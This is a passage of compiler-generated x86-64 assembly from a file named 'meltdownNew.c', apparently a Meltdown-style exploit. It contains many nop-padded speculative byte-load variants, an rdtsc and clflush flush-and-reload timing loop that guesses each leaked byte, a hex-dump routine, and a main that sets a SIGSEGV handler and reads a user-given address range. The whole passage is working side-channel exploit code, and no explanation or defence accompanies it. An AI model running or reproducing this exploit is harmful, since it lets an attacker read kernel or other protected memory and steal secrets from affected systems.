	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 927
.Lprobe_one_win0_var927:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 928
.Lprobe_one_win0_var928:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 929
.Lprobe_one_win0_var929:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 930
.Lprobe_one_win0_var930:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 931
.Lprobe_one_win0_var931:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 932
.Lprobe_one_win0_var932:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 933
.Lprobe_one_win0_var933:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 934
.Lprobe_one_win0_var934:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 935
.Lprobe_one_win0_var935:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 936
.Lprobe_one_win0_var936:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 937
.Lprobe_one_win0_var937:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 938
.Lprobe_one_win0_var938:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 939
.Lprobe_one_win0_var939:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 940
.Lprobe_one_win0_var940:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 941
.Lprobe_one_win0_var941:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 942
.Lprobe_one_win0_var942:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 943
.Lprobe_one_win0_var943:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 944
.Lprobe_one_win0_var944:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 945
.Lprobe_one_win0_var945:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 946
.Lprobe_one_win0_var946:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 947
.Lprobe_one_win0_var947:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 948
.Lprobe_one_win0_var948:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 949
.Lprobe_one_win0_var949:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 950
.Lprobe_one_win0_var950:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 951
.Lprobe_one_win0_var951:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 952
.Lprobe_one_win0_var952:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 953
.Lprobe_one_win0_var953:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 954
.Lprobe_one_win0_var954:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 955
.Lprobe_one_win0_var955:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 956
.Lprobe_one_win0_var956:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 957
.Lprobe_one_win0_var957:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 958
.Lprobe_one_win0_var958:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 959
.Lprobe_one_win0_var959:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 960
.Lprobe_one_win0_var960:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 961
.Lprobe_one_win0_var961:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 962
.Lprobe_one_win0_var962:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 963
.Lprobe_one_win0_var963:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 964
.Lprobe_one_win0_var964:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 965
.Lprobe_one_win0_var965:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 966
.Lprobe_one_win0_var966:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 967
.Lprobe_one_win0_var967:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 968
.Lprobe_one_win0_var968:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 969
.Lprobe_one_win0_var969:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 970
.Lprobe_one_win0_var970:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 971
.Lprobe_one_win0_var971:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 972
.Lprobe_one_win0_var972:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 973
.Lprobe_one_win0_var973:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 974
.Lprobe_one_win0_var974:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 975
.Lprobe_one_win0_var975:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 976
.Lprobe_one_win0_var976:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 977
.Lprobe_one_win0_var977:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 978
.Lprobe_one_win0_var978:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 979
.Lprobe_one_win0_var979:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 980
.Lprobe_one_win0_var980:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 981
.Lprobe_one_win0_var981:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 982
.Lprobe_one_win0_var982:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 983
.Lprobe_one_win0_var983:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 984
.Lprobe_one_win0_var984:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 985
.Lprobe_one_win0_var985:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 986
.Lprobe_one_win0_var986:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 987
.Lprobe_one_win0_var987:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 988
.Lprobe_one_win0_var988:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 989
.Lprobe_one_win0_var989:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 990
.Lprobe_one_win0_var990:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 991
.Lprobe_one_win0_var991:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 992
.Lprobe_one_win0_var992:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 993
.Lprobe_one_win0_var993:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 994
.Lprobe_one_win0_var994:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 995
.Lprobe_one_win0_var995:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 996
.Lprobe_one_win0_var996:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 997
.Lprobe_one_win0_var997:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 998
.Lprobe_one_win0_var998:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 999
.Lprobe_one_win0_var999:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
.Lprobe_one_win0_continue:
__speculative_byte_load_exit:
	nop
# 0 "" 2
#NO_APP
	movl	$0, -2388(%rbp)
	jmp	.L6
.L8:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2344(%rbp)
	movq	-2344(%rbp), %rax
	movq	%rax, %rcx
#APP
# 118 "meltdownNew.c" 1
	mfence
	lfence
	rdtsc
	lfence
	movl	%eax, %esi
	movl	(%rcx), %eax
	lfence
	rdtsc
	subl	%esi, %eax
	clflush	0(%rcx)
# 0 "" 2
#NO_APP
	movq	%rax, -2368(%rbp)
	movq	-2368(%rbp), %rdx
	movl	-2388(%rbp), %eax
	cltq
	movq	%rdx, -2336(%rbp,%rax,8)
	addl	$1, -2388(%rbp)
.L6:
	cmpl	$255, -2388(%rbp)
	jle	.L8
	movl	$0, -2388(%rbp)
	jmp	.L9
.L12:
	movl	-2384(%rbp), %eax
	cltq
	movq	-2336(%rbp,%rax,8), %rax
	movl	-2388(%rbp), %edx
	movslq	%edx, %rdx
	movq	-2336(%rbp,%rdx,8), %rdx
	cmpq	%rax, %rdx
	jnb	.L10
	movl	-2388(%rbp), %eax
	jmp	.L11
.L10:
	movl	-2384(%rbp), %eax
.L11:
	movl	%eax, -2384(%rbp)
	addl	$1, -2388(%rbp)
.L9:
	cmpl	$255, -2388(%rbp)
	jle	.L12
	movl	-2384(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %eax
	leal	1(%rax), %edx
	movl	-2384(%rbp), %eax
	cltq
	movb	%dl, -288(%rbp,%rax)
	addl	$1, -2392(%rbp)
.L3:
	movl	-2392(%rbp), %eax
	cmpl	-2376(%rbp), %eax
	jl	.L13
	movl	$0, -2388(%rbp)
	jmp	.L14
.L17:
	movl	-2388(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %edx
	movl	-2380(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %eax
	cmpb	%dl, %al
	jnb	.L15
	movl	-2388(%rbp), %eax
	jmp	.L16
.L15:
	movl	-2380(%rbp), %eax
.L16:
	movl	%eax, -2380(%rbp)
	addl	$1, -2388(%rbp)
.L14:
	cmpl	$255, -2388(%rbp)
	jle	.L17
	movl	-2380(%rbp), %eax
	movq	-24(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L19
	call	__stack_chk_fail@PLT
.L19:
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE12:
	.size	probe_one, .-probe_one
	.section	.rodata
.LC0:
	.string	"0x%016lx | "
.LC1:
	.string	"%02X "
.LC2:
	.string	"|  %s \n"
.LC3:
	.string	"   "
	.text
	.globl	dump_hex
	.type	dump_hex, @function
dump_hex:
.LFB13:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$80, %rsp
	movq	%rdi, -56(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%rdx, -72(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movb	$0, -16(%rbp)
	movq	-56(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC0(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	$0, -48(%rbp)
	jmp	.L21
.L30:
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$31, %al
	jbe	.L22
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$126, %al
	ja	.L22
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %edx
	movq	-48(%rbp), %rax
	andl	$15, %eax
	movb	%dl, -32(%rbp,%rax)
	jmp	.L23
.L22:
	movq	-48(%rbp), %rax
	andl	$15, %eax
	movb	$46, -32(%rbp,%rax)
.L23:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$7, %eax
	testq	%rax, %rax
	je	.L24
	movq	-48(%rbp), %rax
	addq	$1, %rax
	cmpq	%rax, -72(%rbp)
	jne	.L25
.L24:
	movl	$32, %edi
	call	putchar@PLT
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L26
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L25
.L26:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	cmpq	%rax, -72(%rbp)
	jne	.L25
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	movb	$0, -32(%rbp,%rax)
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	cmpq	$8, %rax
	ja	.L27
	movl	$32, %edi
	call	putchar@PLT
.L27:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	movq	%rax, -40(%rbp)
	jmp	.L28
.L29:
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	addq	$1, -40(%rbp)
.L28:
	cmpq	$15, -40(%rbp)
	jbe	.L29
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L25:
	addq	$1, -48(%rbp)
.L21:
	movq	-48(%rbp), %rax
	cmpq	-72(%rbp), %rax
	jb	.L30
	nop
	movq	-8(%rbp), %rax
	subq	%fs:40, %rax
	je	.L31
	call	__stack_chk_fail@PLT
.L31:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE13:
	.size	dump_hex, .-dump_hex
	.section	.rodata
	.align 8
.LC4:
	.string	"usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n"
.LC5:
	.string	"mmap() failed: %s\n"
	.align 8
.LC6:
	.string	"poke buffer: %p, page size: %i\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB14:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$264, %rsp
	.cfi_offset 3, -24
	movl	%edi, -260(%rbp)
	movq	%rsi, -272(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	call	getpagesize@PLT
	movl	%eax, -244(%rbp)
	movl	$0, -248(%rbp)
	movq	$0, -232(%rbp)
	movq	$0, -224(%rbp)
	leaq	-208(%rbp), %rax
	movl	$152, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	leaq	-208(%rbp), %rax
	addq	$8, %rax
	movq	%rax, %rdi
	call	sigemptyset@PLT
	leaq	sigaction_segv(%rip), %rax
	movq	%rax, -208(%rbp)
	movl	$4, -72(%rbp)
	leaq	-208(%rbp), %rax
	movl	$0, %edx
	movq	%rax, %rsi
	movl	$11, %edi
	call	sigaction@PLT
	cmpl	$2, -260(%rbp)
	jle	.L33
	cmpl	$4, -260(%rbp)
	jle	.L34
.L33:
	movq	-272(%rbp), %rax
	movq	(%rax), %rax
	movq	%rax, %rsi
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	jmp	.L47
.L34:
	movq	-272(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	movl	$16, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	strtoul@PLT
	movq	%rax, -232(%rbp)
	movq	-272(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	movl	$10, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	strtoul@PLT
	movq	%rax, -224(%rbp)
	cmpl	$4, -260(%rbp)
	jne	.L36
	movl	$1, -248(%rbp)
.L36:
	movl	-244(%rbp), %eax
	sall	$8, %eax
	cltq
	movl	$0, %r9d
	movl	$-1, %r8d
	movl	$33, %ecx
	movl	$3, %edx
	movq	%rax, %rsi
	movl	$0, %edi
	call	mmap@PLT
	movq	%rax, -216(%rbp)
	cmpq	$-1, -216(%rbp)
	jne	.L37
	call	__errno_location@PLT
	movl	(%rax), %eax
	movl	%eax, %edi
	call	strerror@PLT
	movq	%rax, %rsi
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
